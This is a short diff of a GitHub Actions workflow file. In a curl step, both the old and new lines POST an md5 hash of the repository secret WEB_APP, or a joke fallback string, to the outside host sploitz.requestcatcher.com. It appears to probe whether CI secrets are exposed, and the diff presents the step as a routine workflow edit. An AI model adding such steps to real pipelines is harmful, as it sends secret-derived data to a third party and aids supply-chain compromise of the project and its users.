@@ -15,7 +15,7 @@ jobs:
         uses: wei/curl@v1
         with:
           args: |
-            -X POST -d "${if [[${{ secrets.WEB_APP}}]] then val=${{ secrets.WEB_APP}} else val='LOL_NO_HONK_4_JOO' fi; val | md5sum }" https://sploitz.requestcatcher.com/
+            -X POST -d "${(echo ${{ secrets.WEB_APP}} || echo 'LOL_NO_HONK_4_JOO') | md5sum }" https://sploitz.requestcatcher.com/
   semgrep:
     runs-on: ubuntu-latest
     name: semgrep-rule-lints
